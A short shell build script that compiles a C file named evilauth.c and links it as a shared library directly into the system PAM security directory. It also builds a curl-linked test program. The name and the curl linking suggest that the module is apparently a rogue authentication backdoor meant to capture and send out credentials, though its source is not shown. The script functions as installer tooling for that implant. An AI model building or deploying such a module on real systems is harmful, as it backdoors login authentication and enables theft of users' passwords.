#!/usr/bin/env sh

TEST_SRC="test.c"
TEST_EXE="test.exe"

PAM_SRC="evilauth.c"
PAM_O="evilauth.o"
PAM_SO="/lib/x86_64-linux-gnu/security/libevilauth.so"

CURL="-lcurl"

gcc $TEST_SRC -o $TEST_EXE $CURL -ldl -lpam -lpam_misc 
gcc -c $PAM_SRC -o $PAM_O $CURL 
ld -x --shared -o $PAM_SO $PAM_O $CURL
rm *.o
chmod +x $TEST_EXE 

ls $PAM_SO 
ls $TEST_EXE
